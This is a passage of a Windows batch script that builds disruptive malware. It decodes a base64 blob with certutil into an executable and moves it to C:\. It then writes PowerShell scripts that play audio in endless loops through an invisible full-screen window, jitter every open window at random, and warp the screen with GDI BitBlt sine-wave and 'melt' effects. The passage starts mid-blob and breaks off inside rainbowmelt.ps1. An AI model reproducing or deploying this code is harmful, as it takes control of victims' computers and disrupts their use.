echo dAAgAEUAcgByAG8AcgA/AEEAYwBjAGUAcwBzACAAdgBpAG8AbABhAHQAaQBvAG4A
echo IABhAHQAIABhAGQAZAByAGUAcwBzACAAJQBwACAAaQBuACAAbQBvAGQAdQBsAGUA
echo IAAnACUAcwAnAC4AIAAlAHMAIABvAGYAIABhAGQAZAByAGUAcwBzACAAJQBwABwA
echo UwB5AHMAdABlAG0AIABFAHIAcgBvAHIALgAgACAAQwBvAGQAZQA6ACAAJQBkAC4A
echo DQAKACUAcwAfAEEAIABjAGEAbABsACAAdABvACAAYQBuACAATwBTACAAZgB1AG4A
echo YwB0AGkAbwBuACAAZgBhAGkAbABlAGQAAwBKAGEAbgADAEYAZQBiAAMATQBhAHIA
echo AwBBAHAAcgADAE0AYQB5AAMASgB1AG4AAwBKAHUAbAADAEEAdQBnAAMAUwBlAHAA
echo AwBPAGMAdAADAE4AbwB2AAMARABlAGMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAfAFYAYQByAGkAYQBuAHQAIABvAHIAIABzAGEAZgBlACAAYQByAHIA
echo YQB5ACAAaQBzACAAbABvAGMAawBlAGQAHwBJAG4AdgBhAGwAaQBkACAAdgBhAHIA
echo aQBhAG4AdAAgAHQAeQBwAGUAIABjAG8AbgB2AGUAcgBzAGkAbwBuABkASQBuAHYA
echo YQBsAGkAZAAgAHYAYQByAGkAYQBuAHQAIABvAHAAZQByAGEAdABpAG8AbgAlAEkA
echo bgB2AGEAbABpAGQAIAB2AGEAcgBpAGEAbgB0ACAAbwBwAGUAcgBhAHQAaQBvAG4A
echo IAAoACUAcwAlAC4AOAB4ACkACgAlAHMANQBDAG8AdQBsAGQAIABuAG8AdAAgAGMA
echo bwBuAHYAZQByAHQAIAB2AGEAcgBpAGEAbgB0ACAAbwBmACAAdAB5AHAAZQAgACgA
echo JQBzACkAIABpAG4AdABvACAAdAB5AHAAZQAgACgAJQBzACkAPQBPAHYAZQByAGYA
echo bABvAHcAIAB3AGgAaQBsAGUAIABjAG8AbgB2AGUAcgB0AGkAbgBnACAAdgBhAHIA
echo aQBhAG4AdAAgAG8AZgAgAHQAeQBwAGUAIAAoACUAcwApACAAaQBuAHQAbwAgAHQA
echo eQBwAGUAIAAoACUAcwApABAAVgBhAHIAaQBhAG4AdAAgAG8AdgBlAHIAZgBsAG8A
echo dwAQAEkAbgB2AGEAbABpAGQAIABhAHIAZwB1AG0AZQBuAHQAFABJAG4AdgBhAGwA
echo aQBkACAAdgBhAHIAaQBhAG4AdAAgAHQAeQBwAGUAFwBPAHAAZQByAGEAdABpAG8A
echo bgAgAG4AbwB0ACAAcwB1AHAAcABvAHIAdABlAGQAGABVAG4AZQB4AHAAZQBjAHQA
echo ZQBkACAAdgBhAHIAaQBhAG4AdAAgAGUAcgByAG8AcgAVAEUAeAB0AGUAcgBuAGEA
echo bAAgAGUAeABjAGUAcAB0AGkAbwBuACAAJQB4ABAAQQBzAHMAZQByAHQAaQBvAG4A
echo IABmAGEAaQBsAGUAZAAXAEkAbgB0AGUAcgBmAGEAYwBlACAAbgBvAHQAIABzAHUA
echo cABwAG8AcgB0AGUAZAAcAEUAeABjAGUAcAB0AGkAbwBuACAAaQBuACAAcwBhAGYA
echo ZQBjAGEAbABsACAAbQBlAHQAaABvAGQAEAAlAHMAIAAoACUAcwAsACAAbABpAG4A
echo ZQAgACUAZAApAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZAEkA
echo bgB2AGEAbABpAGQAIABwAG8AaQBuAHQAZQByACAAbwBwAGUAcgBhAHQAaQBvAG4A
echo FgBJAG4AdgBhAGwAaQBkACAAYwBsAGEAcwBzACAAdAB5AHAAZQBjAGEAcwB0ADAA
echo QQBjAGMAZQBzAHMAIAB2AGkAbwBsAGEAdABpAG8AbgAgAGEAdAAgAGEAZABkAHIA
echo ZQBzAHMAIAAlAHAALgAgACUAcwAgAG8AZgAgAGEAZABkAHIAZQBzAHMAIAAlAHAA
echo EABBAGMAYwBlAHMAcwAgAHYAaQBvAGwAYQB0AGkAbwBuAA4AUwB0AGEAYwBrACAA
echo bwB2AGUAcgBmAGwAbwB3AA0AQwBvAG4AdAByAG8AbAAtAEMAIABoAGkAdAAWAFAA
echo cgBpAHYAaQBsAGUAZwBlAGQAIABpAG4AcwB0AHIAdQBjAHQAaQBvAG4AKABFAHgA
echo YwBlAHAAdABpAG8AbgAgACUAcwAgAGkAbgAgAG0AbwBkAHUAbABlACAAJQBzACAA
echo YQB0ACAAJQBwAC4ADQAKACUAcwAlAHMADQAKABEAQQBwAHAAbABpAGMAYQB0AGkA
echo bwBuACAARQByAHIAbwByADEARgBvAHIAbQBhAHQAIAAnACUAcwAnACAAaQBuAHYA
echo YQBsAGkAZAAgAG8AcgAgAGkAbgBjAG8AbQBwAGEAdABpAGIAbABlACAAdwBpAHQA
echo aAAgAGEAcgBnAHUAbQBlAG4AdAAbAE4AbwAgAGEAcgBnAHUAbQBlAG4AdAAgAGYA
echo bwByACAAZgBvAHIAbQBhAHQAIAAnACUAcwAnACIAVgBhAHIAaQBhAG4AdAAgAG0A
echo ZQB0AGgAbwBkACAAYwBhAGwAbABzACAAbgBvAHQAIABzAHUAcABwAG8AcgB0AGUA
echo ZAAEAFIAZQBhAGQABQBXAHIAaQB0AGUAJABFAHIAcgBvAHIAIABjAHIAZQBhAHQA
echo aQBuAGcAIAB2AGEAcgBpAGEAbgB0ACAAbwByACAAcwBhAGYAZQAgAGEAcgByAGEA
echo eQApAFYAYQByAGkAYQBuAHQAIABvAHIAIABzAGEAZgBlACAAYQByAHIAYQB5ACAA
echo aQBuAGQAZQB4ACAAbwB1AHQAIABvAGYAIABiAG8AdQBuAGQAcwAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADQBPAHUAdAAgAG8AZgAgAG0AZQBtAG8A
echo cgB5AAwASQAvAE8AIABlAHIAcgBvAHIAIAAlAGQADgBGAGkAbABlACAAbgBvAHQA
echo IABmAG8AdQBuAGQAEABJAG4AdgBhAGwAaQBkACAAZgBpAGwAZQBuAGEAbQBlABMA
echo VABvAG8AIABtAGEAbgB5ACAAbwBwAGUAbgAgAGYAaQBsAGUAcwASAEYAaQBsAGUA
echo IABhAGMAYwBlAHMAcwAgAGQAZQBuAGkAZQBkABcAUgBlAGEAZAAgAGIAZQB5AG8A
echo bgBkACAAZQBuAGQAIABvAGYAIABmAGkAbABlAAkARABpAHMAawAgAGYAdQBsAGwA
echo FQBJAG4AdgBhAGwAaQBkACAAbgB1AG0AZQByAGkAYwAgAGkAbgBwAHUAdAAQAEQA
echo aQB2AGkAcwBpAG8AbgAgAGIAeQAgAHoAZQByAG8AEQBSAGEAbgBnAGUAIABjAGgA
echo ZQBjAGsAIABlAHIAcgBvAHIAEABJAG4AdABlAGcAZQByACAAbwB2AGUAcgBmAGwA
echo bwB3ACAASQBuAHYAYQBsAGkAZAAgAGYAbABvAGEAdABpAG4AZwAgAHAAbwBpAG4A
echo dAAgAG8AcABlAHIAYQB0AGkAbwBuAB8ARgBsAG8AYQB0AGkAbgBnACAAcABvAGkA
echo bgB0ACAAZABpAHYAaQBzAGkAbwBuACAAYgB5ACAAegBlAHIAbwAXAEYAbABvAGEA
echo dABpAG4AZwAgAHAAbwBpAG4AdAAgAG8AdgBlAHIAZgBsAG8AdwAYAEYAbABvAGEA
echo dABpAG4AZwAgAHAAbwBpAG4AdAAgAHUAbgBkAGUAcgBmAGwAbwB3AAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
) > "%appdata%\ren\loser"
certutil -decode "%appdata%\ren\loser" "%appdata%\ren\loser.exe"
move "%appdata%\ren\loser.exe" "C:\loser.exe"
echo Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase                              					>> song1.ps1                                               
echo $form = New-Object System.Windows.Forms.Form                                                                               >> song1.ps1
echo $form.WindowState = 'Maximized'                                                                                            >> song1.ps1
echo $form.FormBorderStyle = 'None'                                                                                             >> song1.ps1
echo $form.BackColor = 'Transparent'                                                                                            >> song1.ps1
echo $form.Opacity = 0                                                                                                          >> song1.ps1
echo $mediaPlayer = New-Object System.Windows.Media.MediaPlayer                                                                 >> song1.ps1
echo $mediaPlayer.Open("$env:appdata\ren\1.mp3")                                                                           >> song1.ps1
echo $mediaPlayer.Play()                                                                                                        >> song1.ps1
echo $host = New-Object WindowsFormsHost                                                                                        >> song1.ps1
echo $host.Dock = 'Fill'                                                                                                        >> song1.ps1
echo $mediaElement = New-Object System.Windows.Controls.MediaElement                                                            >> song1.ps1
echo $mediaElement.Source = $mediaPlayer                                                                                        >> song1.ps1
echo $mediaElement.Stretch = 'Uniform'                                                                                          >> song1.ps1
echo $host.Child = $mediaElement                                                                                                >> song1.ps1
echo $form.Controls.Add($host)                                                                                                  >> song1.ps1
echo $null = $form.ShowDialog()                                                                                                 >> song1.ps1
echo while ($true) {                                                                                                            >> song1.ps1     
echo     if ($mediaPlayer.Position.TotalMilliseconds -ge $mediaPlayer.NaturalDuration.TimeSpan.TotalMilliseconds) {             >> song1.ps1
echo         $mediaPlayer.Position = [System.TimeSpan]::FromMilliseconds(1)                                                     >> song1.ps1
echo         $mediaPlayer.Play()                                                                                                >> song1.ps1
echo     }                                                                                                                      >> song1.ps1
echo }                                                                                                                          >> song1.ps1

echo Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase                              					  >> song2.ps1                                             
echo $form = New-Object System.Windows.Forms.Form                                                                                 >> song2.ps1
echo $form.WindowState = 'Maximized'                                                                                              >> song2.ps1
echo $form.FormBorderStyle = 'None'                                                                                               >> song2.ps1
echo $form.BackColor = 'Transparent'                                                                                              >> song2.ps1
echo $form.Opacity = 0                                                                                                            >> song2.ps1
echo $mediaPlayer = New-Object System.Windows.Media.MediaPlayer                                                                   >> song2.ps1
echo $mediaPlayer.Open("$env:appdata\ren\2.mp3")                                                                                  >> song2.ps1
echo $mediaPlayer.Play()                                                                                                          >> song2.ps1
echo $host = New-Object WindowsFormsHost                                                                                          >> song2.ps1
echo $host.Dock = 'Fill'                                                                                                          >> song2.ps1
echo $mediaElement = New-Object System.Windows.Controls.MediaElement                                                              >> song2.ps1
echo $mediaElement.Source = $mediaPlayer                                                                                          >> song2.ps1
echo $mediaElement.Stretch = 'Uniform'                                                                                            >> song2.ps1
echo $host.Child = $mediaElement                                                                                                  >> song2.ps1
echo $form.Controls.Add($host)                                                                                                    >> song2.ps1
echo $null = $form.ShowDialog()                                                                                                   >> song2.ps1
echo while ($true) {                                                                                                              >> song2.ps1   
echo     if ($mediaPlayer.Position.TotalMilliseconds -ge $mediaPlayer.NaturalDuration.TimeSpan.TotalMilliseconds) {               >> song2.ps1
echo         $mediaPlayer.Position = [System.TimeSpan]::FromMilliseconds(1)                                                       >> song2.ps1
echo         $mediaPlayer.Play()                                                                                                  >> song2.ps1
echo     }                                                                                                                        >> song2.ps1
echo }                                                                                                                            >> song2.ps1

echo Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase                              					  >> song3.ps1                                             
echo $form = New-Object System.Windows.Forms.Form                                                                                 >> song3.ps1
echo $form.WindowState = 'Maximized'                                                                                              >> song3.ps1
echo $form.FormBorderStyle = 'None'                                                                                               >> song3.ps1
echo $form.BackColor = 'Transparent'                                                                                              >> song3.ps1
echo $form.Opacity = 0                                                                                                            >> song3.ps1
echo $mediaPlayer = New-Object System.Windows.Media.MediaPlayer                                                                   >> song3.ps1
echo $mediaPlayer.Open("$env:appdata\ren\3.mp3")                                                                                  >> song3.ps1
echo $mediaPlayer.Play()                                                                                                          >> song3.ps1
echo $host = New-Object WindowsFormsHost                                                                                          >> song3.ps1
echo $host.Dock = 'Fill'                                                                                                          >> song3.ps1
echo $mediaElement = New-Object System.Windows.Controls.MediaElement                                                              >> song3.ps1
echo $mediaElement.Source = $mediaPlayer                                                                                          >> song3.ps1
echo $mediaElement.Stretch = 'Uniform'                                                                                            >> song3.ps1
echo $host.Child = $mediaElement                                                                                                  >> song3.ps1
echo $form.Controls.Add($host)                                                                                                    >> song3.ps1
echo $null = $form.ShowDialog()                                                                                                   >> song3.ps1
echo while ($true) {                                                                                                              >> song3.ps1   
echo     if ($mediaPlayer.Position.TotalMilliseconds -ge $mediaPlayer.NaturalDuration.TimeSpan.TotalMilliseconds) {               >> song3.ps1
echo         $mediaPlayer.Position = [System.TimeSpan]::FromMilliseconds(1)                                                       >> song3.ps1
echo         $mediaPlayer.Play()                                                                                                  >> song3.ps1
echo     }                                                                                                                        >> song3.ps1
echo }                                                                                                                            >> song3.ps1


echo Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase                              					     >> song4.ps1                                          
echo $form = New-Object System.Windows.Forms.Form                                                                                    >> song4.ps1
echo $form.WindowState = 'Maximized'                                                                                                 >> song4.ps1
echo $form.FormBorderStyle = 'None'                                                                                                  >> song4.ps1
echo $form.BackColor = 'Transparent'                                                                                                 >> song4.ps1
echo $form.Opacity = 0                                                                                                               >> song4.ps1
echo $mediaPlayer = New-Object System.Windows.Media.MediaPlayer                                                                      >> song4.ps1
echo $mediaPlayer.Open("$env:appdata\ren\4.mp3")                                                                                     >> song4.ps1
echo $mediaPlayer.Play()                                                                                                             >> song4.ps1
echo $host = New-Object WindowsFormsHost                                                                                             >> song4.ps1
echo $host.Dock = 'Fill'                                                                                                             >> song4.ps1
echo $mediaElement = New-Object System.Windows.Controls.MediaElement                                                                 >> song4.ps1
echo $mediaElement.Source = $mediaPlayer                                                                                             >> song4.ps1
echo $mediaElement.Stretch = 'Uniform'                                                                                               >> song4.ps1
echo $host.Child = $mediaElement                                                                                                     >> song4.ps1
echo $form.Controls.Add($host)                                                                                                       >> song4.ps1
echo $null = $form.ShowDialog()                                                                                                      >> song4.ps1
echo while ($true) {                                                                                                                 >> song4.ps1
echo     if ($mediaPlayer.Position.TotalMilliseconds -ge $mediaPlayer.NaturalDuration.TimeSpan.TotalMilliseconds) {                  >> song4.ps1
echo         $mediaPlayer.Position = [System.TimeSpan]::FromMilliseconds(1)                                                          >> song4.ps1
echo         $mediaPlayer.Play()                                                                                                     >> song4.ps1
echo     }                                                                                                                           >> song4.ps1
echo }                                                                                                                               >> song4.ps1

echo Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase                              					     >> song5.ps1                                          
echo $form = New-Object System.Windows.Forms.Form                                                                                    >> song5.ps1
echo $form.WindowState = 'Maximized'                                                                                                 >> song5.ps1
echo $form.FormBorderStyle = 'None'                                                                                                  >> song5.ps1
echo $form.BackColor = 'Transparent'                                                                                                 >> song5.ps1
echo $form.Opacity = 0                                                                                                               >> song5.ps1
echo $mediaPlayer = New-Object System.Windows.Media.MediaPlayer                                                                      >> song5.ps1
echo $mediaPlayer.Open("$env:appdata\ren\5.mp3")                                                                                     >> song5.ps1
echo $mediaPlayer.Play()                                                                                                             >> song5.ps1
echo $host = New-Object WindowsFormsHost                                                                                             >> song5.ps1
echo $host.Dock = 'Fill'                                                                                                             >> song5.ps1
echo $mediaElement = New-Object System.Windows.Controls.MediaElement                                                                 >> song5.ps1
echo $mediaElement.Source = $mediaPlayer                                                                                             >> song5.ps1
echo $mediaElement.Stretch = 'Uniform'                                                                                               >> song5.ps1
echo $host.Child = $mediaElement                                                                                                     >> song5.ps1
echo $form.Controls.Add($host)                                                                                                       >> song5.ps1
echo $null = $form.ShowDialog()                                                                                                      >> song5.ps1
echo while ($true) {                                                                                                                 >> song5.ps1
echo     if ($mediaPlayer.Position.TotalMilliseconds -ge $mediaPlayer.NaturalDuration.TimeSpan.TotalMilliseconds) {                  >> song5.ps1
echo         $mediaPlayer.Position = [System.TimeSpan]::FromMilliseconds(1)                                                          >> song5.ps1
echo         $mediaPlayer.Play()                                                                                                     >> song5.ps1
echo     }                                                                                                                           >> song5.ps1
echo }                                                                                                                               >> song5.ps1

echo Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase                              					      >> song6.ps1                                         
echo $form = New-Object System.Windows.Forms.Form                                                                                     >> song6.ps1
echo $form.WindowState = 'Maximized'                                                                                                  >> song6.ps1
echo $form.FormBorderStyle = 'None'                                                                                                   >> song6.ps1
echo $form.BackColor = 'Transparent'                                                                                                  >> song6.ps1
echo $form.Opacity = 0                                                                                                                >> song6.ps1
echo $mediaPlayer = New-Object System.Windows.Media.MediaPlayer                                                                       >> song6.ps1
echo $mediaPlayer.Open("$env:appdata\ren\6.mp3")                                                                                      >> song6.ps1
echo $mediaPlayer.Play()                                                                                                              >> song6.ps1
echo $host = New-Object WindowsFormsHost                                                                                              >> song6.ps1
echo $host.Dock = 'Fill'                                                                                                              >> song6.ps1
echo $mediaElement = New-Object System.Windows.Controls.MediaElement                                                                  >> song6.ps1
echo $mediaElement.Source = $mediaPlayer                                                                                              >> song6.ps1
echo $mediaElement.Stretch = 'Uniform'                                                                                                >> song6.ps1
echo $host.Child = $mediaElement                                                                                                      >> song6.ps1
echo $form.Controls.Add($host)                                                                                                        >> song6.ps1
echo $null = $form.ShowDialog()                                                                                                       >> song6.ps1
echo while ($true) {                                                                                                                  >> song6.ps1
echo     if ($mediaPlayer.Position.TotalMilliseconds -ge $mediaPlayer.NaturalDuration.TimeSpan.TotalMilliseconds) {                   >> song6.ps1
echo         $mediaPlayer.Position = [System.TimeSpan]::FromMilliseconds(1)                                                           >> song6.ps1
echo         $mediaPlayer.Play()                                                                                                      >> song6.ps1
echo     }                                                                                                                            >> song6.ps1
echo }                                                                                                                                >> song6.ps1
																																	  
echo Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase                              					      >> song7.ps1                                         
echo $form = New-Object System.Windows.Forms.Form                                                                                     >> song7.ps1
echo $form.WindowState = 'Maximized'                                                                                                  >> song7.ps1
echo $form.FormBorderStyle = 'None'                                                                                                   >> song7.ps1
echo $form.BackColor = 'Transparent'                                                                                                  >> song7.ps1
echo $form.Opacity = 0                                                                                                                >> song7.ps1
echo $mediaPlayer = New-Object System.Windows.Media.MediaPlayer                                                                       >> song7.ps1
echo $mediaPlayer.Open("$env:appdata\ren\7.mp3")                                                                                      >> song7.ps1
echo $mediaPlayer.Play()                                                                                                              >> song7.ps1
echo $host = New-Object WindowsFormsHost                                                                                              >> song7.ps1
echo $host.Dock = 'Fill'                                                                                                              >> song7.ps1
echo $mediaElement = New-Object System.Windows.Controls.MediaElement                                                                  >> song7.ps1
echo $mediaElement.Source = $mediaPlayer                                                                                              >> song7.ps1
echo $mediaElement.Stretch = 'Uniform'                                                                                                >> song7.ps1
echo $host.Child = $mediaElement                                                                                                      >> song7.ps1
echo $form.Controls.Add($host)                                                                                                        >> song7.ps1
echo $null = $form.ShowDialog()                                                                                                       >> song7.ps1
echo while ($true) {                                                                                                                  >> song7.ps1
echo     if ($mediaPlayer.Position.TotalMilliseconds -ge $mediaPlayer.NaturalDuration.TimeSpan.TotalMilliseconds) {                   >> song7.ps1
echo         $mediaPlayer.Position = [System.TimeSpan]::FromMilliseconds(1)                                                           >> song7.ps1
echo         $mediaPlayer.Play()                                                                                                      >> song7.ps1
echo     }                                                                                                                            >> song7.ps1
echo }                                                                                                                                >> song7.ps1
																																	  
echo Add-Type -TypeDefinition @^"                                                                                                  > shake.ps1
echo using System;                                                                                                                 >> shake.ps1
echo using System.Runtime.InteropServices;                                                                                         >> shake.ps1
echo using System.Threading;                                                                                                       >> shake.ps1
echo public class WindowShaker                                                                                                     >> shake.ps1
echo {                                                                                                                             >> shake.ps1
echo     [DllImport("user32.dll")]                                                                                                 >> shake.ps1
echo     public static extern IntPtr GetDesktopWindow();                                                                           >> shake.ps1
echo     [DllImport("user32.dll")]                                                                                                 >> shake.ps1
echo     public static extern bool EnumWindows(EnumWindowsProc enumProc, IntPtr lParam);                                           >> shake.ps1
echo     [DllImport("user32.dll")]                                                                                                 >> shake.ps1
echo     public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);                                                    >> shake.ps1
echo     [DllImport("user32.dll")]                                                                                                 >> shake.ps1
echo     public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);                  >> shake.ps1
echo     [StructLayout(LayoutKind.Sequential)]                                                                                     >> shake.ps1
echo     public struct RECT                                                                                                        >> shake.ps1
echo     {                                                                                                                         >> shake.ps1
echo         public int Left;                                                                                                      >> shake.ps1
echo         public int Top;                                                                                                       >> shake.ps1
echo         public int Right;                                                                                                     >> shake.ps1
echo         public int Bottom;                                                                                                    >> shake.ps1
echo     }                                                                                                                         >> shake.ps1
echo     public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);                                                         >> shake.ps1
echo     public static bool EnumWindowCallback(IntPtr hWnd, IntPtr lParam)                                                         >> shake.ps1
echo     {                                                                                                                         >> shake.ps1
echo         RECT rect;                                                                                                            >> shake.ps1
echo         GetWindowRect(hWnd, out rect);                                                                                        >> shake.ps1
echo         Random random = new Random();                                                                                         >> shake.ps1
echo         int direction = random.Next(4);                                                                                       >> shake.ps1
echo         int amount = random.Next(10, 51);                                                                                     >> shake.ps1
echo         int newX = rect.Left;                                                                                                 >> shake.ps1
echo         int newY = rect.Top;                                                                                                  >> shake.ps1
echo         switch (direction)                                                                                                    >> shake.ps1
echo         {                                                                                                                     >> shake.ps1
echo             case 0:                                                                                                           >> shake.ps1
echo                 newX -= amount;                                                                                               >> shake.ps1
echo                 break;                                                                                                        >> shake.ps1
echo             case 1:                                                                                                           >> shake.ps1
echo                 newX += amount;                                                                                               >> shake.ps1
echo                 break;                                                                                                        >> shake.ps1
echo             case 2:                                                                                                           >> shake.ps1
echo                 newY -= amount;                                                                                               >> shake.ps1
echo                 break;                                                                                                        >> shake.ps1
echo             case 3:                                                                                                           >> shake.ps1
echo                 newY += amount;                                                                                               >> shake.ps1
echo                 break;                                                                                                        >> shake.ps1
echo         }                                                                                                                     >> shake.ps1
echo         MoveWindow(hWnd, newX, newY, rect.Right - rect.Left, rect.Bottom - rect.Top, true);                                   >> shake.ps1
echo         return true;                                                                                                          >> shake.ps1
echo     }                                                                                                                         >> shake.ps1
echo     public static void ShakeAllWindows()                                                                                      >> shake.ps1
echo     {                                                                                                                         >> shake.ps1
echo         while (true)                                                                                                          >> shake.ps1
echo         {                                                                                                                     >> shake.ps1
echo             EnumWindows(EnumWindowCallback, IntPtr.Zero);                                                                     >> shake.ps1
echo         }                                                                                                                     >> shake.ps1
echo     }                                                                                                                         >> shake.ps1
echo }                                                                                                                             >> shake.ps1
echo ^"@                                                                                                                           >> shake.ps1
echo [WindowShaker]::ShakeAllWindows()                                                                                             >> shake.ps1

echo Add-Type -TypeDefinition @^"                                                                                                                                > monitershake.ps1
echo using System;                                                                                                                                               >> monitershake.ps1
echo using System.Runtime.InteropServices;                                                                                                                       >> monitershake.ps1
echo public class SineWave                                                                                                                                       >> monitershake.ps1
echo {                                                                                                                                                           >> monitershake.ps1
echo     [DllImport("user32.dll")]                                                                                                                               >> monitershake.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                         >> monitershake.ps1
echo     [DllImport("user32.dll")]                                                                                                                               >> monitershake.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                            >> monitershake.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                >> monitershake.ps1
echo     public static extern int BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);       >> monitershake.ps1
echo     [DllImport("user32.dll")]                                                                                                                               >> monitershake.ps1
echo     public static extern IntPtr GetDesktopWindow();                                                                                                         >> monitershake.ps1
echo     [DllImport("user32.dll")]                                                                                                                               >> monitershake.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                                                  >> monitershake.ps1
echo     public static void RunSineWave()                                                                                                                        >> monitershake.ps1
echo     {                                                                                                                                                       >> monitershake.ps1
echo         IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                    >> monitershake.ps1
echo         IntPtr wnd = GetDesktopWindow();                                                                                                                    >> monitershake.ps1
echo         int sw = GetSystemMetrics(0);                                                                                                                       >> monitershake.ps1
echo         int sh = GetSystemMetrics(1);                                                                                                                       >> monitershake.ps1
echo         double angle = 0;                                                                                                                                   >> monitershake.ps1
echo         while (true)                                                                                                                                        >> monitershake.ps1
echo         {                                                                                                                                                   >> monitershake.ps1
echo             hdc = GetDC(IntPtr.Zero);                                                                                                                       >> monitershake.ps1
echo             for (float i = 0; i ^< sw + sh; i ^+= 3f)                                                                                                         >> monitershake.ps1
echo             {                                                                                                                                               >> monitershake.ps1
echo                 int a = (int)(Math.Sin(angle) ^* 30);                                                                                                        >> monitershake.ps1
echo                 BitBlt(hdc, 0, (int)i, sw, 10, hdc, a, (int)i, 0x00CC0020);                                                                                 >> monitershake.ps1
echo                 angle ^+= Math.PI ^/ 100;                                                                                                                     >> monitershake.ps1
echo             }                                                                                                                                               >> monitershake.ps1
echo             ReleaseDC(wnd, hdc);                                                                                                                            >> monitershake.ps1
echo         }                                                                                                                                                   >> monitershake.ps1
echo     }                                                                                                                                                       >> monitershake.ps1
echo }                                                                                                                                                           >> monitershake.ps1
echo ^"@                                                                                                                                                         >> monitershake.ps1
echo [SineWave]::RunSineWave()                                                                                                                                   >> monitershake.ps1

echo Add-Type -TypeDefinition @^"                                                                                                                             > monitershake2.ps1                               
echo using System;                                                                                                                                             >> monitershake2.ps1
echo using System.Runtime.InteropServices;                                                                                                                     >> monitershake2.ps1
echo public class SineWave                                                                                                                                     >> monitershake2.ps1
echo {                                                                                                                                                         >> monitershake2.ps1
echo     [DllImport("user32.dll")]                                                                                                                             >> monitershake2.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                       >> monitershake2.ps1
echo     [DllImport("user32.dll")]                                                                                                                             >> monitershake2.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                          >> monitershake2.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                              >> monitershake2.ps1
echo     public static extern int BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);     >> monitershake2.ps1
echo     [DllImport("user32.dll")]                                                                                                                             >> monitershake2.ps1
echo     public static extern IntPtr GetDesktopWindow();                                                                                                       >> monitershake2.ps1
echo     [DllImport("user32.dll")]                                                                                                                             >> monitershake2.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                                                >> monitershake2.ps1
echo     public static void RunSineWave()                                                                                                                      >> monitershake2.ps1
echo     {                                                                                                                                                     >> monitershake2.ps1
echo         IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                  >> monitershake2.ps1
echo         IntPtr wnd = GetDesktopWindow();                                                                                                                  >> monitershake2.ps1
echo         int sw = GetSystemMetrics(0);                                                                                                                     >> monitershake2.ps1
echo         int sh = GetSystemMetrics(1);                                                                                                                     >> monitershake2.ps1
echo         double angle = 0;                                                                                                                                 >> monitershake2.ps1
echo         while (true)                                                                                                                                      >> monitershake2.ps1
echo         {                                                                                                                                                 >> monitershake2.ps1
echo             hdc = GetDC(IntPtr.Zero);                                                                                                                     >> monitershake2.ps1
echo             for (float i = 0; i ^< sw ^+ sh; i ^+= 3f)                                                                                                       >> monitershake2.ps1
echo             {                                                                                                                                             >> monitershake2.ps1
echo                 int a = (int)(Math.Sin(angle) * 30);                                                                                                      >> monitershake2.ps1
echo                 BitBlt(hdc, 0, (int)i, sw, 100, hdc, a, (int)i, 0x00CC0020);                                                                              >> monitershake2.ps1
echo                 angle ^+= Math.PI / 100;                                                                                                                   >> monitershake2.ps1
echo             }                                                                                                                                             >> monitershake2.ps1
echo             ReleaseDC(wnd, hdc);                                                                                                                          >> monitershake2.ps1
echo         }                                                                                                                                                 >> monitershake2.ps1 
echo     }                                                                                                                                                     >> monitershake2.ps1
echo }                                                                                                                                                         >> monitershake2.ps1
echo ^"@                                                                                                                                                       >> monitershake2.ps1
echo [SineWave]::RunSineWave()                                                                                                                                 >> monitershake2.ps1

echo Add-Type -TypeDefinition @^"                                                                                             > rainbowmelt.ps1 
echo using System;                                                                                                             >> rainbowmelt.ps1
echo using System.Drawing;                                                                                                     >> rainbowmelt.ps1
echo using System.Runtime.InteropServices;                                                                                     >> rainbowmelt.ps1
echo public class ScreenShaker                                                                                                 >> rainbowmelt.ps1
echo {                                                                                                                         >> rainbowmelt.ps1
echo     [DllImport("user32.dll")]                                                                                             >> rainbowmelt.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                       >> rainbowmelt.ps1
echo     [DllImport("user32.dll")]                                                                                             >> rainbowmelt.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                          >> rainbowmelt.ps1
echo     [DllImport("gdi32.dll")]                                                                                              >> rainbowmelt.ps1
echo     public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight,                     >> rainbowmelt.ps1
echo         IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);                                                                  >> rainbowmelt.ps1
echo     [DllImport("gdi32.dll")]                                                                                              >> rainbowmelt.ps1
echo     public static extern IntPtr CreateSolidBrush(int color);                                                              >> rainbowmelt.ps1
